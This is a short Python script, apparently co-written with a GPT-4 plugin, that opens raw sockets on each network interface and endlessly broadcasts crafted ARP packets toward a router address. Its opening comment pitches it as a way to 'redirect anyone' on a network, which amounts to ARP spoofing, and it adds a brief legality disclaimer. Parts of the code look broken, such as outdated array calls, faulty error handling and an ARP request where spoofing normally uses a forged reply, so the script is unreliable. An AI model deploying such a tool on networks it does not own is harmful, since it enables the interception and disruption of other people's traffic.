# Dylan Kenneth Eliot & GPT-4-plugins (Alpha Edition)

"""


Now anyone can redirect anyone.... Even at or before the network router.

Due realize that doing this to someone else without their consent is a cyber security crime (193 to 195 cyber security laws)
 in 180 to 270+ sovern parts of the globe. 

It is, however, perfectly legal to hack yourself.


"""


import socket
import struct
import fcntl
import os
import array
import time

# Constants for Ethernet frame
ETH_P_ALL = 0x0003
BROADCAST_MAC = b'\xff\xff\xff\xff\xff\xff'

def get_interface_list():
    max_possible = 128  # Arbitrary. Adjust as needed.
    bytes = max_possible * 32
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    names = array.array('B', b'\0' * bytes)
    outbytes = struct.unpack('iL', fcntl.ioctl(
        s.fileno(),
        0x8912,  # SIOCGIFCONF
        struct.pack('iL', bytes, names.buffer_info()[0])
    ))[0]
    namestr = names.tostring()
    return [namestr[i:i+32].split(b'\0', 1)[0] for i in range(0, outbytes, 32)]

def create_raw_socket(interface):
    try:
        s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(ETH_P_ALL))
        s.bind((interface, 0))
        return s
    except socket.error as msg:
        print(f'Socket could not be created on {interface}. Error Code : {str(msg[0])} Message {msg[1]}')
        return None

def craft_arp_packet(src_mac, src_ip, dst_ip):
    # Ethernet header
    eth_hdr = struct.pack("!6s6sH", BROADCAST_MAC, src_mac, 0x0806)
    
    # ARP header
    arp_hdr = struct.pack("!HHBBH6s4s6s4s", 
                          0x0001, 0x0800, 6, 4, 0x0001, 
                          src_mac, socket.inet_aton(src_ip), 
                          BROADCAST_MAC, socket.inet_aton(dst_ip))
    
    return eth_hdr + arp_hdr

def send_arp_packet(sock, packet, interface):
    sock.send(packet)

def main():
    interfaces = get_interface_list()
    for interface in interfaces:
        if_name = interface.decode()
        if if_name != 'lo':
            print(f"Targeting interface: {if_name}")

            # Define your source MAC and IP addresses here
            src_mac = b'\x00\x0c\x29\x4b\x8d\x2c'  # Example MAC address
            src_ip = '192.168.1.100'  # Example IP address

            # Define the target IP address here
            target_ip = '192.168.1.1'  # Example target IP address

            # Create a raw socket
            s = create_raw_socket(if_name)
            if s:
                arp_packet = craft_arp_packet(src_mac, src_ip, target_ip)
                while True:
                    send_arp_packet(s, arp_packet, if_name)
                    time.sleep(2)  # Send ARP packets at regular intervals

if __name__ == '__main__':
    main()

